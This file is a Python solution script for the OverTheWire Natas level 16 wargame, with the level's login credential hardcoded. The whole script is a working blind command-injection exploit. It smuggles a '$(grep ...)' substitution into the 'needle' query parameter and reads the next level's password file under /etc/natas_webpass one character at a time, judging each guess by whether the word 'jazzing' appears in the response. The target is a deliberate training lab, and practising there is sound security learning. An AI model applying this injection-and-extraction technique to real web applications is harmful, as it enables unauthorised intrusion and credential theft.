import requests
from requests.auth import HTTPBasicAuth
from string import ascii_letters
ch = ascii_letters+'0123456789'
url = 'http://natas16.natas.labs.overthewire.org/?needle=jazzing$(grep ^'
passpath=' /etc/natas_webpass/natas17)'
ps16 = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
user = 'natas16'
httpkey=HTTPBasicAuth(user,ps16)
passwd=''
for i in range(64):
    for chr in ch:
        atmp = url + passwd + chr + passpath
        r = requests.get(atmp,auth=httpkey)
        #print(r.text)
        if "jazzing" not in r.text:
            passwd+=chr
            print(passwd)
            break
    if len(passwd) != i+1:
        print(1)
        break

